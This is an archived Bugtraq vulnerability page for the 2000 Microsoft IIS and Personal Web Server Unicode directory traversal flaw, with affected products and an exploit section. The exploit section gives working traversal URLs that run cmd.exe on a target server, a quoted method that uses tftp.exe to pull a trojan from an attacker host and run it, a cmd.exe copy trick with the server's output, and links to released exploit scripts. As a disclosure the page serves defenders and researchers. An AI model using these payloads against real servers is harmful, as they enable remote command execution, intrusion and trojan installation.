#SpeeDr00t@Black Falcon<br>#bid1806<p><b><span style="font-size: 18pt;">Microsoft IIS and PWS Extended Unicode Directory Traversal Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/1806/info">info</a><br><a href="http://www.securityfocus.com/bid/1806/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/1806/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/1806/solution">solution</a><br><a href="http://www.securityfocus.com/bid/1806/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				1806
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Input Validation Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Oct 17 2000 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Oct 17 2000 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				Discovered by an anonymous poster to a Packetstorm forum.  Additional research conducted by Rain Forest Puppy &lt;rfp@wiretrip.net&gt;.  Publicized in a Microsoft Security Bulletin (MS00-078) on October 17, 2000. Microsoft Personal Web Server discovered and post
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Microsoft Personal Web Server  4.0<br/>
<span class="related">
						
							+ 
						
						Microsoft NT Option Pack for NT 4.0  0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft NT Option Pack for NT 4.0  0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows 98  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows 98  <br/>
</span>
					
				
					Microsoft IIS  5.0<br/>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Advanced Server  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Advanced Server  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Advanced Server  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Advanced Server  SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows 2000 Advanced Server  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows 2000 Advanced Server  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Datacenter Server  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Datacenter Server  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Datacenter Server  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Datacenter Server  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows 2000 Professional  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows 2000 Professional  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Server  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Server  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Server  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Server  SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows 2000 Server  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows 2000 Server  <br/>
</span>
					
				
					Microsoft IIS  4.0 alpha<br/>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 alpha<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 alpha<br/>
</span>
					
				
					Microsoft IIS  4.0<br/>
<span class="related">
						
							+ 
						
						Cisco Building Broadband Service Manager (BBSM) 5.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Building Broadband Service Manager (BBSM) 5.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Call Manager 3.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Call Manager 3.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Call Manager 2.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Call Manager 2.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Call Manager 1.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Call Manager 1.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco ICS 7750  <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco ICS 7750  <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco IP/VC 3540 Video Rate Matching Module  <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco IP/VC 3540 Video Rate Matching Module  <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Unity Server 2.4 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Unity Server 2.4 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Unity Server 2.3 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Unity Server 2.3 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Unity Server 2.2 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Unity Server 2.2 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Unity Server 2.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco Unity Server 2.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco uOne 4.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco uOne 4.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco uOne 3.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco uOne 3.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco uOne 2.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco uOne 2.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco uOne 1.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Cisco uOne 1.0 <br/>
</span>
<span class="related">
						
							+ 
						
						Hancom Hancom Office 2007  0<br/>
</span>
<span class="related">
						
							+ 
						
						Hancom Hancom Office 2007  0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft BackOffice  4.5<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft BackOffice  4.5<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT 4.0 Option Pack  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT 4.0 Option Pack  <br/>
</span>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
</td>
</tr>
</table>
</div><br><br>#<br>#<br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	CORE has developed a working commercial exploit for their IMPACT product. This exploit is not otherwise publicly available or known to be circulating in the wild.<br/><br/>The following examples were provided:<br/><br/>http://target/scripts/..%c1%1c../path/file.ext<br/><br/>Eg.<br/><br/>http://target/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir<br/>http://target/scripts/..%c0%9v../winnt/system32/cmd.exe?/c+dir<br/>http://target/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir<br/>http://target/scripts/..%c0%qf../winnt/system32/cmd.exe?/c+dir<br/>http://target/scripts/..%c1%8s../winnt/system32/cmd.exe?/c+dir<br/>http://target/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir<br/>http://target/scripts/..%c1%pc../winnt/system32/cmd.exe?/c+dir <br/><br/>http://target/msadc/..%c0%af../..%c0%af../..%c0%af../winnt/system32/<br/>cmd.exe?/c+dir<br/><br/>Zoa_Chien &lt;zoachien@securax.org&gt; describes the following exploits using TFTP or Samba in his post to Bugtraq:<br/><br/>By using tftp.exe that comes with NT and win2k by connecting and<br/>downloading a trojan from a tftp daemon you can bypass these<br/>restrictions. Install &lt; ftp://ftp.cavebear.com/karl/tftpd32.zip &gt;<br/>and connect from your compromised to your local machine using the<br/>command " tftp.exe -i xxx.xxx.xxx.xxx GET ncx99.exe ".<br/>You van do so wiith this url:<br/>/bin-dir/..%c0%af../winnt/system32/tftp.exe+"-i"+xxx.xxx.xxx.xxx+GET+ncx99.exe+c:\winnt\system32\ncx99.exe<br/>then all you have to do is run the trojan with:<br/>/bin-dir/..%c0%af../winnt/system32/ncx99.exe<br/><br/>You might also use the samba commands: "net share and net user"<br/>on the target and "net use" on the local machine... but this does<br/>not always seem to work. (coz. netbios is not installed?)<br/><br/>In their post to Bugtraq, Nsfocus Security Team &lt;security@nsfocus.com&gt; describes how to execute commands using a redirect on the target host:<br/><br/>(1) copy "..\..\winnt\system32\cmd.exe" to "..\..\interpub\scripts\cmd1.exe"<br/><br/>http://site/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+copy+..\..\winnt\system32\cmd.exe+cmd1.exe<br/><br/>IIS returned :<br/><br/>"CGI Error<br/>The specified CGI application misbehaved by not returning a complete set of HTTP headers. <br/>The headers it did return are:<br/><br/><br/>        1 file(s) copied."<br/><br/><br/>(2) run "cmd1.exe /c echo abc &gt;aaa &amp; dir &amp; type aaa "<br/><br/>http://site/scripts/..%c1%9c../inetpub/scripts/cmd1.exe?/c+echo+abc+&gt;aaa&amp;dir&amp;type+aaa<br/><br/>IIS returned :<br/><br/>" Directory of c:\inetpub\scripts<br/><br/>10/25/2000  03:48p      &lt;DIR&gt;          .<br/>10/25/2000  03:48p      &lt;DIR&gt;          ..<br/>10/25/2000  03:51p                   6 aaa<br/>12/07/1999  05:00a             236,304 cmd1.exe<br/>..<br/>abc<br/>"<br/><br/>Optyx &lt;optyx@newhackcity.net&gt; has released the following exploits:<br/><br/>iis-zang.c<br/>iis-zang.exe<br/>iis-zang.obsd<br/>iis-zang.linux<br/><br/>Roelof Temmingh &lt;roelof@sensepost.com&gt; has released the following exploits:<br/><br/>unicodecheck.pl<br/>unicodexecute.pl<br/>unicodexecute2.pl<br/><br/>&lt;Eliel.Sardanons@philips.edu.ar&gt; has released the following exploit:<br/><br/>iisuni.c<br/><br/>BoloTron &lt;bolo@mundivia.com&gt; has provided the following exploit:<br/><br/>iis-kabom.php<br/><br/>Gabriel Maggiotti &lt;gmaggiot@ciudad.com.ar&gt; has provided the following exploit:<br/><br/>all_uniexp.c<br/><br/>This is the vulnerability exploited by the Code Blue Worm.<br/><br/>SPAX &lt;spabam@yahoo.com&gt; has provided the following exploit:<br/><br/>IIS-PLUS.PL
	
		<ul>
<li><a href="/data/vulnerabilities/exploits/iis-zang.c">/data/vulnerabilities/exploits/iis-zang.c</a></li>
<li><a href="/data/vulnerabilities/exploits/iis-zang.exe">/data/vulnerabilities/exploits/iis-zang.exe</a></li>
<li><a href="/data/vulnerabilities/exploits/iis-zang.obsd">/data/vulnerabilities/exploits/iis-zang.obsd</a></li>
<li><a href="/data/vulnerabilities/exploits/iis-zang.linux">/data/vulnerabilities/exploits/iis-zang.linux</a></li>
<li><a href="/data/vulnerabilities/exploits/unicodecheck.pl">/data/vulnerabilities/exploits/unicodecheck.pl</a></li>
<li><a href="/data/vulnerabilities/exploits/unicodexecute.pl">/data/vulnerabilities/exploits/unicodexecute.pl</a></li>
<li><a href="/data/vulnerabilities/exploits/unicodexecute2.pl">/data/vulnerabilities/exploits/unicodexecute2.pl</a></li>
<li><a href="/data/vulnerabilities/exploits/iisuni.c">/data/vulnerabilities/exploits/iisuni.c</a></li>
<li><a href="/data/vulnerabilities/exploits/iis-kabom.php">/data/vulnerabilities/exploits/iis-kabom.php</a></li>
<li><a href="/data/vulnerabilities/exploits/all_uniexp.c">/data/vulnerabilities/exploits/all_uniexp.c</a></li>
<li><a href="/data/vulnerabilities/exploits/IIS-PLUS.PL">/data/vulnerabilities/exploits/IIS-PLUS.PL</a></li>
</ul>
</div>